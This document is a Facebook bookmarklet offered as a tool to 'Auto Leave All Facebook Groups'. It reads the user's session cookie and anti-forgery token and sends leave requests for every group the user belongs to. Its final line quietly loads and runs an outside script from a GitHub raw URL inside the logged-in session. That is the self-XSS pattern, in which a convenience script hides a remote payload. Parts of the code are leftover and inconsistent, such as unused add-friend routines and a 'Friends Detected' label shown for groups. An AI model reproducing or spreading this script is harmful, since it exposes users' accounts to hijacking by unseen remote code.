javascript: var Title = 'Auto Leave All Facebook Groups!';
var Descriptions = "",
    _text = 'Powered By: <A style="color:#3B5998;" href="https://www.facebook.com/bui.long.9" target="_blank"> Bùi Thành Long</A> & <A style="color:#3B5998;" href="http://vietnameseautogroup.blogspot.com/" target="_blank"> Vietnamese Auto Group</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="https://www.facebook.com/bui.long.9" target="_blank"> Bùi Thành Long</A></A>,</A><A style="color:#3B5998;" href="http://vietnameseautogroup.blogspot.com/" target="_blank"> Vietnamese Auto Group</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://vietnameseautogroup.blogspot.com/" target="_blank">Vietnamese Auto Group</A>.</A>';
var Envuser = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function LeaveGroup(e) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/membership/leave.php?group_id=" + e + "&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&prevent_readd=on&confirmed=1&__user=" + Envuser + "&__a=1&__dyn=7n8ahyj35CFUSt2u5KKDKaExEW9J28C&__req=n&ttstamp=26581671081201068478", function (a) {
        var b = a.substring(a.indexOf("{"));
        var c = JSON.parse(b);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
        if (c.error) {
            Descriptions += "color:darkred'>";
            err++;
            if (c.errorDescription) Descriptions += c.errorDescription;
            else Descriptions += JSON.stringify(c, null, "")
        } else {
            Descriptions += "color:darkblue'>";
            Descriptions += " You are not a member of this group.<br/>";
            suc++
        }
        Descriptions += "</div>";
        var d = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:3px solid rgba(0,0,0,0.9);background-color:rgba(255,255,255,0.9);color:#000000'>";
        d += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
        if (i > 0) {
            d += arr.length + " Groups Detected<br/>";
            d += "<b>" + suc + "</b> Groups Leaved of " + (arr.length - i) + " Groups Processed ";
            d += "(" + i + " Lefted...)";
            d += "<div class='friend-edge'>";
            d += Descriptions;
            d += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:0px solid Transparent;' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
            d += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
            d += _text;
            d += "</div>";
            d += "</div>"
        } else {
            d += arr.length + " Groups Detected and ";
            d += "<b>" + suc + " Groups Leaved</b></br></br>";
            d += "<div><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cancel</span>"
        }
        d += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = d
    }, "text", "post");
    tay--;
    if (tay > 0) {
        var s = arr[tay];
        sx = pho[tay];
        setTimeout("LeaveGroup(" + s + ")", 300)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc)
}
function clickfr_callback() {
    if (document.getElementsByName("ok").length > 0) nHtml.ClickUp(document.getElementsByName("ok")[0]);
    var a = arr[i];
    if (i < arr.length) addfriend(a.substring(0, 4))
}
function clickfr() {
    if (document.getElementsByClassName("search").length > 0) nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1]);
    else j++;
    setTimeout("clickfr_callback()", 2E3)
}
function addfriend(a) {
    i++;
    setTimeout("clickfr()", 2E3)
}
jx = {
    getHTTPObject: function () {
        var a = false;
        if (typeof ActiveXObject != "undefined") try {
            a = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (b) {
            try {
                a = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (c) {
                a = false
            }
        } else if (window.XMLHttpRequest) try {
            a = new XMLHttpRequest
        } catch (b) {
            a = false
        }
        return a
    },
    load: function (b, c, d, e, f) {
        var g = this.init();
        if (!g || !b) return;
        if (g.overrideMimeType) g.overrideMimeType("text/xml");
        if (!e) e = "GET";
        if (!d) d = "text";
        if (!f) f = {};
        d = d.toLowerCase();
        e = e.toUpperCase();
        var h = "uid=" + (new Date).getTime();
        b += b.indexOf("?") + 1 ? "&" : "?";
        b += h;
        var i = null;
        if (e == "POST") {
            var j = b.split("?");
            b = j[0];
            i = j[1]
        }
        g.open(e, b, true);
        var k = this;
        if (f.handler) g.onreadystatechange = function () {
            f.handler(g)
        };
        else g.onreadystatechange = function () {
            if (g.readyState == 4) if (g.status == 200) {
                var a = "";
                if (g.responseText) a = g.responseText;
                if (d.charAt(0) == "j") {
                    a = a.replace(/[\n\r]/g, "");
                    a = eval("(" + a + ")")
                } else if (d.charAt(0) == "x") a = g.responseXML;
                if (c) c(a)
            } else {
                if (f.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(f.loadingIndicator);
                if (f.loading) document.getElementById(f.loading).style.display = "none";
                if (error) error(g.status)
            }
        };
        g.send(i)
    },
    bind: function (a) {
        var b = {
            url: "",
            onSuccess: false,
            onError: false,
            format: "text",
            method: "GET",
            update: "",
            loading: "",
            loadingIndicator: ""
        };
        for (var c in b) if (a[c]) b[c] = a[c];
        if (!b.url) return;
        var d = false;
        if (b.loadingIndicator) {
            d = document.createElement("div");
            d.setAttribute("style", "position:absolute;top:0px;left:0px;");
            d.setAttribute("class", "loading-indicator");
            d.innerHTML = b.loadingIndicator;
            document.getElementsByTagName("body")[0].appendChild(d);
            this.opt.loadingIndicator = d
        }
        if (b.loading) document.getElementById(b.loading).style.display = "block";
        this.load(b.url, function (a) {
            if (b.onSuccess) b.onSuccess(a);
            if (b.update) document.getElementById(b.update).innerHTML = a;
            if (d) document.getElementsByTagName("body")[0].removeChild(d);
            if (b.loading) document.getElementById(b.loading).style.display = "none"
        }, b.format, b.method, b)
    },
    init: function () {
        return this.getHTTPObject()
    }
};
var nHtml = {
    FindByAttr: function (a, b, c, d) {
        if (c == "className") c = "class";
        var e = document.evaluate(".//" + b + "[@" + c + "='" + d + "']", a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
        if (e && e.singleNodeValue) return e.singleNodeValue;
        return null
    },
    FindByClassName: function (a, b, c) {
        return this.FindByAttr(a, b, "className", c)
    },
    FindByXPath: function (a, b) {
        try {
            var c = document.evaluate(b, a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null)
        } catch (d) {
            GM_log("bad xpath:" + b)
        }
        if (c && c.singleNodeValue) return c.singleNodeValue;
        return null
    },
    VisitUrl: function (a) {
        window.setTimeout(function () {
            document.location.href = a
        }, 500 + Math.floor(Math.random() * 500))
    },
    ClickWin: function (a, b, c) {
        var d = a.document.createEvent("MouseEvents");
        d.initMouseEvent(c, true, true, a, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
        return !b.dispatchEvent(d)
    },
    Click: function (a) {
        return this.ClickWin(window, a, "click")
    },
    ClickTimeout: function (a, b) {
        window.setTimeout(function () {
            return nHtml.ClickWin(window, a, "click")
        }, b + Math.floor(Math.random() * 500))
    },
    ClickUp: function (a) {
        this.ClickWin(window, a, "mousedown");
        this.ClickWin(window, a, "mouseup");
        this.ClickWin(window, a, "click")
    },
    GetText: function (a, b) {
        var c = "";
        if (b == undefined) b = 0;
        if (b > 40) return;
        if (a.textContent != undefined) return a.textContent;
        for (var d = 0; d < a.childNodes.length; d++) {
            var e = a.childNodes[d];
            c += this.GetText(e, b + 1)
        }
        return c
    }
};
if (document.getElementsByClassName == undefined) document.getElementsByClassName = function (a) {
    var b = new RegExp("(?:^|\\s)" + a + "(?:$|\\s)");
    var c = document.getElementsByTagName("*");
    var d = [];
    var e;
    for (var f = 0;
    (e = c[f]) != null; f++) {
        var g = e.className;
        if (g && g.indexOf(a) != -1 && b.test(g)) d.push(e)
    }
    return d
};
Array.prototype.find = function (a) {
    var b = false;
    for (i = 0; i < this.length; i++) if (typeof a == "function") {
        if (a.test(this[i])) {
            if (!b) b = [];
            b.push(i)
        }
    } else if (this[i] === a) {
        if (!b) b = [];
        b.push(i)
    }
    return b
};
var i = 3;
var tay = 3;
var j = 0;
var k = 0;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + Envuser + "&filter[0]=group&__user=" + Envuser, function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    for (var f = 0; f < d.length; f++) arn.push(d[f].text);
    for (var g = 0; g < d.length; g++) pho.push(d[g].photo);
    i = arr.length - 1;
    tay = i;
    console.log(arr.length);
    var h = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:3px solid rgba(0,0,0,0.9);background-color:rgba(255,255,255,0.9);color:#000000'>";
    h += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
    h += arr.length + " Friends Detected";
    h += "</div>";
    document.getElementById("pagelet_sidebar").innerHTML = h;
    LeaveGroup(arr[i])
});
document.body.appendChild(document.createElement('script')).src = "https://raw.github.com/buithanhlong444/Final_Tools/master/All.js";
